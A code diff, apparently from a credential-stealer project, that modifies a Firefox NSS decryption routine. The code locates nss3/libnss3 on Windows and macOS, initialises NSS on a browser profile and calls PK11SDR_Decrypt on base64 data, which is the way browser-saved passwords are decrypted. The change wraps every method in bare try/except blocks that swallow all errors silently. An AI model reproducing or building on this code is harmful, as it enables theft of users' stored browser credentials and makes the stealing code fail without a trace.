@@ -396,88 +396,111 @@ class NSSDecoder(object):
         ...
 
     def __init__(self):
-        self.NSS = None
-        self.load_libnss()
-        SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
-        SECItemPtr = ctypes.POINTER(self.SECItem)
-        self._set_ctypes(c_int, "NSS_Init", c_char_p)
-        self._set_ctypes(c_int, "NSS_Shutdown")
-        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
-        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
-        self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
-        self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
-        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)
-        self._set_ctypes(c_int, "PORT_GetError")
-        self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
-        self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)
+        try:
+            self.NSS = None
+            self.load_libnss()
+            SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
+            SECItemPtr = ctypes.POINTER(self.SECItem)
+            self._set_ctypes(c_int, "NSS_Init", c_char_p)
+            self._set_ctypes(c_int, "NSS_Shutdown")
+            self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
+            self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
+            self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
+            self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
+            self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)
+            self._set_ctypes(c_int, "PORT_GetError")
+            self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
+            self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)
+        except:
+            pass
 
     def _set_ctypes(self, restype, name, *argtypes):
-        res = getattr(self.NSS, name)
-        res.restype = restype
-        res.argtypes = argtypes
-        setattr(self, "_" + name, res)
-
-    @staticmethod
-    def find_nss(locations, nssname):
-        for loc in locations:
-            if os.path.exists(os.path.join(loc, nssname)):
-                return loc
-        return ""
-
-    def load_libnss(self):
-        if os.name == "nt":
-            nssname = "nss3.dll"
-            locations = (
-                "", 
-                r"C:\Program Files (x86)\Mozilla Firefox",
-                r"C:\Program Files\Mozilla Firefox"
-            )
-            firefox = self.find_nss(locations, nssname)
-            if firefox:
-                os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
-        elif os.uname()[0] == "Darwin":
-            nssname = "libnss3.dylib"
-            locations = (
-                "",  
-                "/usr/local/lib/nss",
-                "/usr/local/lib",
-                "/opt/local/lib/nss",
-                "/sw/lib/firefox",
-                "/sw/lib/mozilla",
-                "/usr/local/opt/nss/lib", 
-                "/opt/pkg/lib/nss",
-            )
-            firefox = self.find_nss(locations, nssname)
-        else:
-            nssname = "libnss3.so"
-            firefox = ""
         try:
-            if firefox:
-                nsslib = os.path.join(firefox, nssname)
-                self.NSS = ctypes.CDLL(nsslib)
-        except Exception as e:
+            res = getattr(self.NSS, name)
+            res.restype = restype
+            res.argtypes = argtypes
+            setattr(self, "_" + name, res)
+        except:
             pass
 
 
+    @staticmethod
+    def find_nss(locations, nssname):
+        try:
+            for loc in locations:
+                if os.path.exists(os.path.join(loc, nssname)):
+                    return loc
+            return ""
+        except:
+            pass
+
+
+    def load_libnss(self):
+        try:
+            if os.name == "nt":
+                nssname = "nss3.dll"
+                locations = (
+                    "", 
+                    r"C:\Program Files (x86)\Mozilla Firefox",
+                    r"C:\Program Files\Mozilla Firefox"
+                )
+                firefox = self.find_nss(locations, nssname)
+                if firefox:
+                    os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
+            elif os.uname()[0] == "Darwin":
+                nssname = "libnss3.dylib"
+                locations = (
+                    "",  
+                    "/usr/local/lib/nss",
+                    "/usr/local/lib",
+                    "/opt/local/lib/nss",
+                    "/sw/lib/firefox",
+                    "/sw/lib/mozilla",
+                    "/usr/local/opt/nss/lib", 
+                    "/opt/pkg/lib/nss",
+                )
+                firefox = self.find_nss(locations, nssname)
+            else:
+                nssname = "libnss3.so"
+                firefox = ""
+            try:
+                if firefox:
+                    nsslib = os.path.join(firefox, nssname)
+                    self.NSS = ctypes.CDLL(nsslib)
+            except Exception as e:
+                pass
+        except:
+            pass
+
+
+
     def handle_error(self):
-        code = self._PORT_GetError()
-        name = self._PR_ErrorToName(code)
-        name = "NULL" if name is None else name.decode("ascii")
-        text = self._PR_ErrorToString(code, 0)
-        text = text.decode("utf8")
+        try:
+            code = self._PORT_GetError()
+            name = self._PR_ErrorToName(code)
+            name = "NULL" if name is None else name.decode("ascii")
+            text = self._PR_ErrorToString(code, 0)
+            text = text.decode("utf8")
+        except:
+            pass
+
 
     def decode(self, data64):
-        data = b64decode(data64)
-        inp = self.SECItem(0, data, len(data))
-        out = self.SECItem(0, None, 0)
-        e = self._PK11SDR_Decrypt(inp, out, None)
         try:
-            if e == -1:
-                pass
-            res = ctypes.string_at(out.data, out.len).decode("utf8")
-        finally:
-            self._SECITEM_ZfreeItem(out, 0)
-        return res
+            data = b64decode(data64)
+            inp = self.SECItem(0, data, len(data))
+            out = self.SECItem(0, None, 0)
+            e = self._PK11SDR_Decrypt(inp, out, None)
+            try:
+                if e == -1:
+                    pass
+                res = ctypes.string_at(out.data, out.len).decode("utf8")
+            finally:
+                self._SECITEM_ZfreeItem(out, 0)
+            return res
+        except:
+            pass
+
 
 
 
@@ -1740,9 +1763,12 @@ class hwkish_first_funct(Functions):
         return args
     
     def load_profile(self, profile):
-        self.profile = profile
-        e = self.NSS._NSS_Init(b"sql:" + self.profile.encode("utf8"))
-        if e != 0:
+        try:
+            self.profile = profile
+            e = self.NSS._NSS_Init(b"sql:" + self.profile.encode("utf8"))
+            if e != 0:
+                pass
+        except:
             pass
 
     def authenticate(self, interactive):
